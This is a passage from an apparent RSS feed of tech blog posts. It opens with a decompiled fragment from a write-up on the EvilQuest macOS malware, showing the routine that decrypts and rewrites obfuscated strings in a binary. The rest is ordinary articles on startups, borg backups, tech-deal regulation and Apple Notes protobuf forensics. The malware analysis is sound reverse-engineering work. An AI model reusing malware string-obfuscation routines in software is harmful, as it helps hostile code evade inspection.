    <span>// obfuscated string is "__cstring"
</span><span></span>    v2 <span>=</span> fg_decrypt_0000Bg_string(<span>"000Bg{00000H0nQ4XL1qPsnl3oBkir1CDCUq3Z{iy|22B2MZ0000073"</span>);
    <span>if</span> ( <span>!</span>strcmp((<span>const</span> <span>char</span> <span>*</span>)v12, v2) ) {
        v11 <span>=</span> (<span>__int64</span>)sub_100006580(a1, <span>*</span>(<span>unsigned</span> <span>int</span> <span>*</span>)(v12 <span>+</span> <span>48</span>), <span>*</span>(_QWORD <span>*</span>)(v12 <span>+</span> <span>40</span>));
        v10 <span>=</span> <span>0LL</span>;
        v9 <span>=</span> <span>0LL</span>;
        v8 <span>=</span> <span>0</span>;
        fseek(a1, <span>*</span>(<span>unsigned</span> <span>int</span> <span>*</span>)(v12 <span>+</span> <span>48</span>), <span>0</span>);
        <span>while</span> ( (<span>unsigned</span> <span>__int64</span>)v8 <span>&lt;</span> <span>*</span>(_QWORD <span>*</span>)(v12 <span>+</span> <span>40</span>) ) {
            <span>if</span> ( <span>*</span>(_BYTE <span>*</span>)(v11 <span>+</span> v8) ) {
                <span>++</span>v9;
            }
            <span>else</span> <span>if</span> ( v9 ) {
                v7 <span>=</span> (<span>char</span> <span>*</span>)calloc(<span>1uLL</span>, v9 <span>+</span> <span>1</span>);
                __memcpy_chk(v7, v10 <span>+</span> v11, v9, <span>-</span><span>1LL</span>);
                v6 <span>=</span> fg_decrypt_0000Bg_string(v7);
                __s <span>=</span> (<span>char</span> <span>*</span>)fg_encrypt_0000Bg_string(v6);
                <span>if</span> ( v7 <span>!=</span> v6 ) {
                    v3 <span>=</span> strlen(__s);
                    <span>if</span> ( v3 <span>==</span> strlen(v7) ) {
                        fseek(a1, v10 <span>+</span> <span>*</span>(<span>unsigned</span> <span>int</span> <span>*</span>)(v12 <span>+</span> <span>48</span>), <span>0</span>);
                        fwrite(__s, <span>1uLL</span>, v9, a1);
                        free(v6);
                    }
                }
                free(v7);
                free(__s);
                v10 <span>+=</span> v9 <span>+</span> <span>1</span>;
                v9 <span>=</span> <span>0LL</span>;
            }
            <span>else</span> {
           …</code></pre></div></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://reverse.put.as/2020/09/17/evilquest-revisited/">https://reverse.put.as/2020/09/17/evilquest-revisited/</a></em></p>]]>
            </description>
            <link>https://reverse.put.as/2020/09/17/evilquest-revisited/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532184</guid>
            <pubDate>Sun, 20 Sep 2020 06:02:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Startups are a complex multivariable equation]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24531852">thread link</a>) | @grwthckrmstr
<br/>
September 19, 2020 | https://www.preetamnath.com/blog/startups-multivariable-equation | <a href="https://web.archive.org/web/*/https://www.preetamnath.com/blog/startups-multivariable-equation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Launching a startup and building it into a successful business requires a multidisciplinary skillset. Because startups are a complex <a href="https://en.wikipedia.org/wiki/Multivariable_calculus" target="_blank">multivariable equation</a>.</p><p>You have moving target, which is somewhat in sight but not really. You’re wearing glasses but objects at a great distance are blurry.&nbsp;</p><p>The multivariable equation looks something like this</p><ul role="list"><li>understanding the market and finding a gap</li><li>coming up with a product thesis to solve the customer’s needs</li><li>finding the right distribution channels that are profitable</li><li>discovering pockets of places to find the initial set of customers</li><li>positioning the solution with the right messaging</li><li>creating the right business model and pricing structure</li><li>building competitive differentiation to fight off competition</li><li>having a founding team that has the right skillset for all the problems listed above and the million others that aren’t</li></ul><figure id="w-node-2bc32fdcbb34-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f66be2bf4382616b86f3dba_startup%20complex%20multivariable%20equation%20photo.jpg" loading="lazy" alt=""></p><figcaption><em>Photo by </em><a href="https://unsplash.com/@barkiple?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank"><em>John Barkiple</em></a></figcaption></figure><p>There’s a million reasons a startup might fail. And you cannot control those million factors of chaos.</p><p>But you can piece together parts of this equation (via discovery) and solve them one by one. Solving a piece of the equation reduces your chances of crash and burn, i.e. increases your chances of success.</p><p>The factors I’ve listed above are some of the more well understood parts of this equation, and ones that you can actually control and influence.</p><p>However, it doesn’t matter if you get only solve a few parts of the equation, because one or two wrong answers such as distribution channels or business model might be enough to kill your business. That’s what runway (frugality, burn rate, funding, customer revenue) is for.</p><p>Even if you get all the above factors right, it takes a lot of time and effort for your business to take off, to build up momentum and achieve <a href="https://www.preetamnath.com/blog/momentum-escape-velocity" target="_blank">escape velocity</a>.</p><p>It boils down to - Can you solve your startup's multivariable equation before you run out of runway?</p><figure id="w-node-c061837fdebd-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f66c1f176b8944f5e9c79f3_startup%20runway.jpg" loading="lazy" alt=""></p><figcaption><em>Photo by </em><a href="https://unsplash.com/@jmoncasi?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank"><em>Jordi Moncasi</em></a><a href="https://unsplash.com/?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText"></a></figcaption></figure><p>This is why a lot of successful businesses don’t do something entirely new and from the ground up. They take something existing and working and improve parts of the equation. </p><p>Zoom took WebEx and made the product delightfully easy to use.</p><p>And similarly, a lot of businesses are copycats. They copy something existing and improve upon it slightly and meaningfully. One can argue that <a href="https://invertedpassion.com/copying-ideas-is-highly-underrated/" target="_blank">copying ideas</a> is highly underrated. </p><p>Instagram Stories is basically Snapchat’s innovation, but they won because the distribution piece of the equation was far ahead.</p><p>Zoom and Instagram simply picked a multivariable equation where some of the unknowns were already solved for.</p></div></div>]]>
            </description>
            <link>https://www.preetamnath.com/blog/startups-multivariable-equation</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531852</guid>
            <pubDate>Sun, 20 Sep 2020 04:15:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Backing up data like the adult I supposedly am]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24531670">thread link</a>) | @signa11
<br/>
September 19, 2020 | https://magnusson.io/post/backups/ | <a href="https://web.archive.org/web/*/https://magnusson.io/post/backups/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
      <div>
        

<article>
  <header>
  
  
  <time datetime="2020-09-18T10:47:47+02:00">
    18 September, 2020
  </time>
  
</header>

  <p>Like so many things I’m supposed to do but don’t — getting exercise, eating right, sleeping well, standing up for women and minorities in public spaces — backing up my data has always been something I’ve half-assed at best.</p>
<p>I’ve lugged around an external hard drive with a few hundred gigabytes of data for the last 10 years, and made backups to it once every three or four years or so. Every time I’ve tried restoring anything from those backups I’ve regretted it, because of course I just bought the drive, plugged it in and copied stuff to it, so it is a FAT32 drive while I have mostly had EXT4 filesystems, which means all my file permissions get lost during the process.</p>
<p>I’ve written shameful little shell scripts to set file permissions to 0644 and directory permissions to 0755, recursively, many many times.</p>
<p>Part of my problem was that I both know just enough rsync to be dangerous and have a credit card so I can provision cloud VMs, so forever just around the corner was my perfect backup solution that I’d write myself and maintain and actually do instead of dealing with whatever I had going on in my life. I’ve come to accept that this will never happen, or perhaps more definitively, that I’d rather cut myself than write and maintain another piece of ad-hoc software for myself.</p>
<p>Luckily I recently found two things that have solved this whole problem for me: <a href="https://borgbackup.readthedocs.io/en/stable/">borg</a> and <a href="https://www.rsync.net/">rsync.net</a>.</p>
<p>Borg is backup software. It compresses and deduplicates data at the block level, and strongly encourages (but does not force) you to encrypt data before backing it up. It is everything I’d want from my half-assed rsync and shell script abomination.</p>
<p>I read its documentation a couple of times and was impressed. I then set about comparing different VM hosts to see which one would give me the cheapest block storage option, when the result of some <a href="https://github.com/scotte/borgsnap">random google search</a> led me to rsync.net. They are a company that stores backups, pretty cheaply, and <a href="http://www.rsync.net/products/attic.html">even more cheaply</a> if you use borg to take them. I guess they just really love borg and want us to love it too.</p>
<p>I signed up for their cheapest plan, which starts at 100GB stored for $18 per year. They have no network in- or egress costs, and the storage amount can be adjusted at any time. Once my account had been activated, I did a little password reset dance, and uploaded a public SSH key.</p>
<p>I wanted to back up my <code>$HOME</code> directory, so after installing borg I ran:</p>
<div>
<div>
<pre>export BORG_REMOTE_PATH="borg1"
borg init --encryption repokey-blake2 UID@ch-s011.rsync.net:home</pre>
</div>
</div>
<p>This created a remote borg repository called "home" on rsync.net’s servers. The environment variable is so we use a more recent version of borg on the remote server (version 1.1.11 at the time of writing), as the default version is rather old (version 0.29.0).</p>
<p>When choosing what encryption method to use, one can choose between a "repokey" or a "keyfile". They both create a private key locked with a passphrase; the difference is that with "repokey" the key is stored in the borg repo, while with "keyfile" it is stored outside of it. This boils down to whether we think a passphrase is enough security for our data, or whether we think having a secret keyfile is necessary. I figured my password manager could create a strong enough passphrase for my needs, and I didn’t want to think about losing the keyfile, so I chose "repokey-blake2".</p>
<p>To create my first backup, I ran</p>
<div>
<div>
<pre>borg create --exclude "$HOME/.cache" UID@ch-s011.rsync.net:home::backup-1 "$HOME"</pre>
</div>
</div>
<p>which created the archive "backup-1" in my "home" borg repository. I didn’t change the compression algorithm from the default one.</p>
<p>By default borg compresses data with lz4. It can use other compression methods (xz, zlib, zstd). I compared their compression ratios on some binary files I had and found no difference between them. I think this is because the large binary files I have are mostly audio and video files in lossy formats, which don’t seem to benefit very much from further compression. I have a lot of text files as well, but text takes up so little relative space on today’s hardware that it makes no sense to spend CPU cycles on compressing it better than lz4 does.</p>
<p>This backup command hummed along for a good while, and through a couple of reboot cycles. Doing a second backup right after it finished (or the day after) took a lot less time because of the deduplication:</p>
<div>
<div>
<pre>borg create --exclude "$HOME/.cache" UID@ch-s011.rsync.net:home::backup-2 "$HOME"</pre>
</div>
</div>
<p>Restoring from backup is also easy:</p>
<div>
<div>
<pre>borg extract UID@ch-s011.rsync.net:home::backup-2</pre>
</div>
</div>
<p>I set this up to run as a daily timed systemd service at noon (very easy on NixOS, which every Linux user should be using unless they hate themselves), and will never, ever think about this again. For a handful of bucks a year, that is a good deal.</p>

  







  



</article>


      </div>
    </div>
  </div></div>]]>
            </description>
            <link>https://magnusson.io/post/backups/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531670</guid>
            <pubDate>Sun, 20 Sep 2020 03:16:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Era of Regulatory Grift: TikTok-Oracle, NXP-Qualcomm, Arm-Nvidia]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24531657">thread link</a>) | @ceohockey60
<br/>
September 19, 2020 | https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/ | <a href="https://web.archive.org/web/*/https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="english-version">
                        <p>The dictionary definition of the word “grift” is as follows: “<a href="https://www.merriam-webster.com/dictionary/grift">to acquire money or property illicitly</a>”. It may be a strong word, but also more or less encapsulates the regulatory ethos that’s governing cross-border technology businesses these days.</p><p>The TikTok-Oracle deal flaunts this grifting ethos, but it’s just the latest example of a series of haphazard regulatory actions mired in geopolitical brinkmanship -- a trend that may implicate deals with much larger impact, like the pending Nvidia acquisition of Arm.</p><h2 id="tiktok-oracle">TikTok-Oracle</h2><p>There are still many missing details to the TikTok-Oracle deal, and Trump <a href="https://uk.reuters.com/article/us-usa-tiktok-oracle/trump-raises-questions-about-tiktok-oracle-deal-if-bytedance-ties-remain-idUKKBN2672KD">may not approve the deal</a>. But in the grand scheme of things, many of these details are no longer important, because the spirit of the entire TikTok “soap opera” is cemented: a <strong>regulatory grift </strong>by the Trump administration that enriches its political donor (Larry Ellison), strengthens its campaign message (anti-China, job creation), while doing next to nothing to protect Americans from either intrusive data collection or foreign influence.</p><p>Let’s look at each of these malfeasances.</p><p><strong><em>What Oracle gets.</em></strong> TikTok’s immediate business value accrues to Oracle Cloud to the tune of possibly <a href="https://www.theinformation.com/articles/with-tiktok-deal-oracle-could-gain-billion-dollar-cloud-customer?utm_content=article-4850&amp;utm_campaign=article_email&amp;utm_source=sg&amp;utm_medium=email">$1 billion in annual revenue</a> in the coming years, as it desperately tries to catch up to AWS and Azure. The Oracle brand may also get a boost from this young, cool consumer product, even though Oracle has no experience running such a product. Since I’ve written in detail about TikTok’s business value in “<a href="https://interconnected.blog/what-is-tiktok-worth-to-whom-and-why/"><strong>What is TikTok Worth to Whom and Why?</strong></a>”, I won’t repeat myself here. <strong>One element I did not discuss so explicitly is how valuable TikTok’s user data is to the Oracle data broker business.</strong></p><p>In a nutshell, a data broker sells data to third parties mostly for marketing or advertisement purposes. Oracle’s data broker businesses are euphemistically called <a href="https://www.oracle.com/cx/marketing/">Oracle CX Marketing</a> and <a href="https://www.oracle.com/data-cloud/">Oracle Data Cloud</a>. Having the treasure trove of data that TikTok has already collected is perhaps an even more immediate business boost to Oracle than getting the product’s workload onto its cloud. Ironically (or perhaps appropriately), the person who called out the privacy violations of data brokers like Oracle, Equifax, and others is <a href="https://www.linkedin.com/in/michael-beckerman-9b750a58/"><strong>Michael Berkerman</strong></a><strong>, who is currently TikTok US’s Head of Public Policy</strong>. He did so last year as the then President and CEO of the Internet Association in <a href="https://www.foxnews.com/opinion/michael-beckerman-why-do-we-need-a-federal-privacy-law-ask-the-data-brokers-selling-your-private-information">an OpEd published on Fox News</a> -- a “media” outlet that the President of the United States most certainly pays attention to. I wonder how long Berkerman will be sticking around, if at all, after the TikTok-Oracle deal closes.</p><p>Lastly, Oracle will likely get a <a href="https://www.ft.com/content/58eb7c26-2154-477f-af19-19157ae29261">minority stake in TikTok</a> with ByteDance still being the majority shareholder. This piece of equity in one of the most valuable private tech companies in the world -- trading at a $140 billion valuation in the secondary market earlier this year -- is something that Oracle would have no business getting in a normal investing situation. Not a bad deal <a href="https://www.businessinsider.com/oracle-billionaire-larry-ellison-is-fundraising-for-donald-trump-2020-2">for hosting a single fundraiser</a>.</p><p><strong><em>What the Trump campaign gets.</em> </strong>Being more “anti-China” than Biden and going after the Vice President’s son’s business dealings in China has been a messaging tentpole of the Trump re-election campaign. It can now claim credit for acting tough and forcing a marquee Chinese tech company to “surrender” its crown jewel product to America, while accomplishing none of those things, because TikTok’s core technology is staying with ByteDance in China.</p><p>The Oracle bid also apparently includes a “<strong>20,000 new jobs” </strong>commitment -- a typical public relations promise with no legally binding effect. Being “anti”-China while “creating” jobs is a strong one-two punch as we approach the final stretch of the 2020 election season, so much so that Secretary Mnuchin couldn't wait to sell the 20,000 jobs message on CNBC the day after Oracle’s winning bid was made public, <em>even though</em> the deal hasn’t been approved or finalized yet.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/ZPRPswu2Cyc?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>TikTok US’s current payroll is about 1,400 people. <strong>That would be an almost 20x increase in headcount.</strong> Theoretically possible? Sure. Practical and sensible? Hardly.</p><p><em><strong>What the American people get.</strong> </em>Nothing, except that they still get to watch cool dance videos and <a href="https://www.tiktok.com/@rosssmith/video/6797540353730743557">grandmas do this</a> on their phones. We have no new information or answer to any of the three legitimate concerns surrounding TikTok:</p><ul><li>Does it send data to China?</li><li>Is its user data collection practices proper?</li><li>Is it being used as a tool for foreign influence?</li></ul><p>To be clear, there <em>are</em> regulatory tools based on technology at our disposal to answer these questions, <strong>with or without Oracle</strong>. I’ve laid them out in detail in “<a href="https://interconnected.blog/a-framework-to-dis-trust-and-verify-tiktok/"><strong>A Framework to (Dis)trust and Verify TikTok</strong></a>”. Unfortunately, it’s clear as day that the Trump administration is only interested in the political messaging benefits of TikTok-Oracle, not doing the actual work that is required to protect the interests of the American people.</p><p><strong>There is another winner that we should all take note of: <em>Chinese regulators.</em></strong></p><p>Chinese regulators typically use their power to force technology and IP transfers from foreign entities to domestic companies via joint-ventures or outright acquisitions -- <strong>another form of regulatory grift</strong>. This TikTok-Oracle deal is the first time to my knowledge, where Chinese regulators use their power to protect a home-grown technology from being <em>transferred out</em> to a foreign entity.</p><p>This win has just as much to do with exerting their regulatory power as the sucker on the other side of the negotiation table. This dynamic isn’t new, if we look at the failed NXP-Qualcomm acquisition in 2018.</p><h2 id="nxp-qualcomm">NXP-Qualcomm</h2><p>Qualcomm’s attempt to buy the Dutch semiconductor maker, NXP, for $44 billion was abandoned, because it could not get approval from Chinese regulators. This occurred during the previous height of tension when the U.S. and China were tossing retaliatory trade tariffs at each other like a couple of teenage boys in a backyard snowball fight.</p><p>The Chinese regulators did not disapprove of the deal and asked for changes to gain approval, which would’ve been a good faith move. <strong>They just ignored it and let the deadline pass.</strong> This is after Secretary Mnuchin and his Commerce Department counterpart, Wilbur Ross, lobbied the Chinese Vice Minister, Liu He, and Ambassador to the US, Cui Tiankai, to approve the deal. The backdrop of this lobbying was Trump easing the penalties on the Chinese telecom equipment maker, ZTE, for violating U.S. sanction rules with regard to Iran and North Korea -- hoping for some reciprocity and dealmaking.</p><p>This foolish hope did not pan out. Instead, Qualcomm, America’s national champion in the race to 5G, had to fork up a <a href="https://www.wsj.com/articles/qualcomm-plans-to-abandon-nxp-deal-1532549728">$2 billion cancellation fee to NXP and increase its stock buyback program from $10 to $30 billion</a> to appease its shareholders. What’s more, this turn of events showed Chinese regulators that given the <strong>interconnected nature of the global economy</strong>, particularly technology businesses, they have far-reaching authority and leverage to shape deals, events, and technology acquisition vis-a-vis <strong>a tough-talking, weak-acting </strong>Trump administration. It is a key reversal in fortune, when a large swath of China’s technology sector, particularly Huawei, has been hammered by U.S. sanctions.</p><p>Qualcomm-NXP was a defensive play -- not approving a deal. TikTok-Oracle is a proactive play -- not losing control of domestic technology. <strong>There’s now an opportunity for even more aggressive “regulatory grift”: Arm-Nvidia.</strong></p><h2 id="arm-nvidia">Arm-Nvidia</h2><p>It’s hard to comprehend the long-term impact that Nvidia’s $40 billion acquisition of Arm will have on the future of technology. One thing is certain though: it’s way more important than TikTok and Oracle, separately and combined.</p><p>We shouldn’t assume the Arm-Nvidia deal will be closed as expected given all the corporate governance issues with Arm’s China operation. Arm China’s CEO, Allen Wu, has been fired by the board for various acts of conflicts of interest and double dealing, <a href="https://www.zdnet.com/article/arms-fired-china-jv-head-refuses-to-leave-company-reps-banned-from-company-premises/">yet refuses to leave</a>. Arm’s CEO, Simon Segars, is trying to assure the public that the mess <a href="https://www.yicaiglobal.com/news/chip-designer-arm-to-solve-chinese-jv-management-issue-before-nvidia-buyout">will be cleaned up </a>in order to not endanger the sale, but he’s not in a position of leverage, now that the deal is public and the expectations are high. (Nvidia’s market cap increased by $17.5 billion the day after the deal was announced.)</p><p>Furthermore, the Arm China division is a joint-venture where 51% of the entity is owned by a consortium of these three funds:</p><ul><li><a href="https://en.wikipedia.org/wiki/China_Investment_Corporation">China Investment Corporation</a> (China’s sovereign wealth fund)</li><li><a href="https://en.wikipedia.org/wiki/Silk_Road_Fund">Silk Road Fund</a> (a state-owned fund focused on projects related to the Belt &amp; Road Initiative)</li><li><a href="https://en.wikipedia.org/wiki/Temasek_Holdings">Temasek Holding</a> (Singapore’s sovereign wealth fund)</li></ul><p>The other 49% is owned by Softbank via Arm. The joint venture structure is par for the course for any foreign technology company doing business in China. But such a tight ownership by state-owned funds means Chinese regulators (and Singaporean regulators for that matter) have strong jurisdictional power over the deal from the get-go. NXP-Qualcomm’s legal hook was a tenuous nexus. TikTok-Oracle’s hook was established by <a href="https://en.pingwest.com/a/7657">an eleventh hour change</a> to the government’s technology “entity list”. Arm-Nvidia doesn’t need any extra work for regulators to aggressively insert themselves into the picture.</p><p>What will the Chinese regulators do is hard to tell at this moment. However, given the fact that Arm’s chip design IP has a 95% global market share in mobile devices and is <a href="https://www.zdnet.com/article/aws-graviton2-what-it-means-for-arm-in-the-data-center-cloud-enterprise-aws/">making inroads into cloud data centers</a> as well, <strong>it’s likely that China will either veto the deal (like NXP-Qualcomm) or try to keep any semiconductor IP that Arm China has even a tangential connection to</strong>. Some Chinese tech media <a href="https://mp.weixin.qq.com/s/W8nhj6udDTdr54ui7_0RIQ">are already speculating about a veto</a>. Using this opportunity to acquire some key technology also makes sense, because by <em>not</em> doing so, China runs the monumental risk of having the entire Arm ecosystem be subject to U.S. sanctions after it becomes a property of Nvidia. An “<strong>Arm sanction</strong>” would cripple China’s entire mobile technology sector, where domestic chip design options barely exist and the open source option, RISC-V, still …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/">https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/</a></em></p>]]>
            </description>
            <link>https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531657</guid>
            <pubDate>Sun, 20 Sep 2020 03:08:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Prodigal Techbro]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24531490">thread link</a>) | @cyunker
<br/>
September 19, 2020 | https://conversationalist.org/2020/03/05/the-prodigal-techbro/ | <a href="https://web.archive.org/web/*/https://conversationalist.org/2020/03/05/the-prodigal-techbro/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://conversationalist.org/2020/03/05/the-prodigal-techbro/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531490</guid>
            <pubDate>Sun, 20 Sep 2020 02:06:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Apple Notes Protobuf]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24531472">thread link</a>) | @todsacerdoti
<br/>
September 19, 2020 | https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/ | <a href="https://web.archive.org/web/*/https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody"> <p><strong>TL;DR</strong>: This post explains portions of two protobufs used by Apple, one for the Note format itself and another for embedded objects. More importantly, it explains how you can figure out the structure of protobufs.</p> <!--more--> <h2 id="background">Background</h2> <p>Previous entries in this series covered how to deal with <a href="https://ciofecaforensics.com/2020/01/10/apple-notes-revisited/">Apple Notes</a> and the <a href="https://ciofecaforensics.com/2020/01/13/apple-notes-revisited-easy-embedded-objects/">embedded objects</a> in them, including <a href="https://ciofecaforensics.com/2020/01/14/apple-notes-revisited-embedded-tables/">embedded tables</a> and <a href="https://ciofecaforensics.com/2020/01/20/apple-notes-revisited-galleries/">galleries</a>. Throughout these posts, I have referred to the fact that Apple uses protocol buffers (protobufs) to store the information for both notes and the embedded objects within them. What I have not yet done is actually provide the .proto file that was used to generate the Ruby output, or explained how you can develop the same on your app of interest. If you only care about the first part of that, you can view the <a href="https://github.com/threeplanetssoftware/apple_cloud_notes_parser/blob/master/proto/notestore.proto">.proto file</a> or the <a href="https://github.com/threeplanetssoftware/apple_cloud_notes_parser/blob/master/proto/protobuf_config.py">config</a> I use for <a href="https://github.com/jmendeth/protobuf-inspector">protobuf-inspector</a>. Both of these files are just a start to pull out the important parts for processing and can certainly be improved.</p> <p>As with previous entries, I want to make sure I give credit where it is due. After pulling apart the Note protobuf and while I was trying to figure out the table protobuf, I came across <a href="https://github.com/dunhamsteve">dunhamsteve’s</a> work. As a result, I went back and modified some of my naming to better align to what he had <a href="https://github.com/dunhamsteve/notesutils/blob/master/notes.md">published</a> and added in some fields like version which I did not have the data to discover.</p> <h2 id="what-is-a-protocol-buffer">What is a Protocol Buffer?</h2> <p>To quote directly from <a href="https://developers.google.com/protocol-buffers">the source</a>,</p> <blockquote> <p>Protocol buffers are Google’s language-neutral, platform-neutral, extensible mechanism for serializing structured data – think XML, but smaller, faster, and simpler. You define how you want your data to be structured once, then you can use special generated source code to easily write and read your structured data to and from a variety of data streams and using a variety of languages.</p> </blockquote> <p>What does that mean? It means a protocol buffer is a way you can write a specification for your data and use it in many projects and languages with one command. The end result is source code for whatever language you are writing in. For example, <a href="https://github.com/sballin/alfred-search-notes-app/blob/master/search/proto/notestore.pb.go">Sean Ballinger’s Alfred Search Notes App</a> used my <code>notestore.proto</code> file to compile to Go instead of Ruby to interact with Notes on MacOS. When you use it in your program, the data which you save will be a raw data stream which won’t look like much, but will be intelligable to any code with that protobuf definition.</p> <p>The definition is generally a <code>.proto</code> file which would look something like:</p> <figure><pre><code data-lang="protobuf"><span>syntax</span> <span>=</span> <span>"proto2"</span><span>;</span>

<span>// Represents an attachment (embedded object)</span>
<span>message</span> <span>AttachmentInfo</span> <span>{</span>
   <span>optional</span> <span>string</span> <span>attachment_identifier</span> <span>=</span> <span>1</span><span>;</span>
   <span>optional</span> <span>string</span> <span>type_uti</span> <span>=</span> <span>2</span><span>;</span>
<span>}</span></code></pre></figure> <p>This definition would have just one message type (AttachmentInfo), with two fields (attachment_identifier and type_uti), both optional. This is using the <code>proto2</code> syntax.</p> <h2 id="why-care-about-protobufs">Why Care About Protobufs</h2> <p>Protobufs are everywhere, especially if you happen to be working with or looking at Google-based systems, such as Android. Apple also uses a lot of them in iOS, and for people that have to support both operating systems, using a protobuf makes the pain of maintaining two different code bases slightly less annoying because you can compile the same definition to different languages. If you are in forensics, you may come across something that looks like it isn’t plaintext and discover that you’re actually looking at a protobuf. When it comes specifically to Apple Notes, protobufs are used both for the Note itself and the attachments.</p> <h2 id="how-to-use-a-proto-file">How to Use a .proto file</h2> <p>Assuming you have a <code>.proto</code> file, either from building one yourself or from finding one from your favorite application, you can compile it to your target language using <a href="https://github.com/protocolbuffers/protobuf/releases">protoc</a>. The resulting file can then be included in your project using whatever that language’s include statement is to create the necessary classes for the data. For example, when writing Apple Cloud Notes Parser in Ruby, I used <code>protoc --ruby_out=. ./proto/notestore.proto</code> to compile it and then <code>require_relative 'notestore_pb.rb'</code> in my code to include it.</p> <p>If I wanted instead to add in support for python, I would only have to make this change: <code>protoc --ruby_out=. --python_out=. ./proto/notestore.proto</code></p> <h2 id="how-can-you-find-a-protobuf-definition-file">How Can You Find a Protobuf Definition File?</h2> <p>If you come up against a protobuf in an application you are looking at, you might be able to find the <code>.proto</code> protobuf definition file in the application itself or somewhere on the forensic image. I ended up going through an iOS 13 forensic image earlier this year and found that Apple still had some of theirs on disk:</p> <figure><pre><code data-lang="shell"><span>[</span>notta@cuppa iOS13_logical]<span>$ </span>find | <span>grep</span> <span>'\.proto$'</span>
./System/Library/Frameworks/MultipeerConnectivity.framework/MultipeerConnectivity.proto
./System/Library/PrivateFrameworks/ActivityAchievements.framework/ActivityAchievementsBackCompat.proto
./System/Library/PrivateFrameworks/ActivityAchievements.framework/ActivityAchievements.proto
./System/Library/PrivateFrameworks/CoreLocationProtobuf.framework/Support/Harvest/CLPCollectionRequest.proto
./System/Library/PrivateFrameworks/ActivitySharing.framework/ActivitySharingDatabaseCodables.proto
./System/Library/PrivateFrameworks/ActivitySharing.framework/ActivitySharingDomainCodables.proto
./System/Library/PrivateFrameworks/ActivitySharing.framework/ActivitySharingInvitationCodables.proto
./System/Library/PrivateFrameworks/ActivitySharing.framework/ActivitySharingCloudKitCodables.proto
./System/Library/PrivateFrameworks/CloudKitCode.framework/RecordTransport.proto
./System/Library/PrivateFrameworks/RemoteMediaServices.framework/RemoteMediaServices.proto
./System/Library/PrivateFrameworks/CoreDuet.framework/knowledge.proto
./System/Library/PrivateFrameworks/HealthDaemon.framework/Statistics.proto
./System/Library/PrivateFrameworks/AVConference.framework/VCCallInfoBlob.proto
./System/Library/PrivateFrameworks/AVConference.framework/captions.proto</code></pre></figure> <p>Some of these are <em>really</em> interesting when you look at them, particularly if you care about their location data and pairing. You don’t even have to have an iOS forensic image sitting around as all of the same files are included in your copy of MacOS 10.15.6, as well, if you run <code>sudo find /System/ -iname "*.proto"</code>. I am not including any interesting snippets of those because they are copyrighted by Apple and I would explicitly note that none are related to Apple Notes or the contents of this post.</p> <p>In general, you should not expect to find these definitions sitting around since the definition file isn’t needed once the code is generated. For more open source applications, you might be interested in some <a href="https://www.google.com/search?q=ext%3Aproto++AND+inurl%3Aproto+AND+message+AND+proto2">Google Dorks</a>, especially when looking at Android artifacts, as you might still find them.</p> <h2 id="how-can-you-rebuild-the-protobuf">How Can You Rebuild The Protobuf?</h2> <p>But what if you can’t find the definition file, how can you rebuild it yourself? This was the most interesting part of rewriting Apple Cloud Notes Parser as I had no knowledge of how Apple typically represents data, nor protobufs, so it was a fun learning adventure.</p> <p>If you have nothing else, the <code>protoc --decode-raw</code> command can give you an intial look at what is in the data, however this amounts to not much more than pretty printing a JSON object, it doesn’t do a great job of telling you you what might be in there. I made heavy use of mildsunrise’s <a href="https://github.com/mildsunrise/protobuf-inspector">protobuf-inspector</a> which at least makes an attempt to tell you what you might be looking at. Another benefit to using this is that it lets you incrementally build up your own definition by editing a file named <code>protobuf_config.py</code> in the protobuf-insepctor folder.</p> <p>For example, below is the output from protobuf-inspector when I ran it on the Gunzipped contents of one of the first notes in my test database.</p> <figure><pre><code 